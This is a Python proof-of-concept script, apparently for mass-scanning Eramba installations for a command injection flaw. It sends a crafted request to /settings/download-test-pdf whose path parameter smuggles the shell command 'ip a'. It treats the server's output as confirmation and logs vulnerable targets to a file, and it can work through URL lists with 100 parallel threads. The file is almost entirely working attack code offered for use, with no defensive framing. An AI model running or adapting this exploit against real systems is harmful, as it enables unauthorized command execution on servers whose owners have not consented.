import requests, sys,argparse
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()


def banner():
    test = """
        
                ███████╗██████╗  █████╗ ███╗   ███╗██████╗  █████╗ 
                ██╔════╝██╔══██╗██╔══██╗████╗ ████║██╔══██╗██╔══██╗
                █████╗  ██████╔╝███████║██╔████╔██║██████╔╝███████║
                ██╔══╝  ██╔══██╗██╔══██║██║╚██╔╝██║██╔══██╗██╔══██║
                ███████╗██║  ██║██║  ██║██║ ╚═╝ ██║██████╔╝██║  ██║
                ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═════╝ ╚═╝  ╚═╝
                                                                author:秋妤
                                                                data:2024.09.13
                                                                version:1.0
"""

    print(test)



def poc(target):
    url_payload = '/settings/download-test-pdf?path=ip%20a'
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
    }

    try:
        res1 = requests.get(url=target + url_payload, headers=headers, timeout=10)
        if '127' in res1.text and res1.status_code == 500:
            print(f"[+]{target} 存在漏洞！")
            with open('Eramba_result.txt', 'a', encoding='utf-8') as f:
                f.write(target + '\n')
        else:
            print(f'[-]{target}不存在漏洞')
    except:
        print('目标网站存在问题，无法访问')


def main():
    banner()
    parser = argparse.ArgumentParser(description='Eramba任意代码执行漏洞')
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please enter url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='Please enter file')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

if __name__ == '__main__':
    main()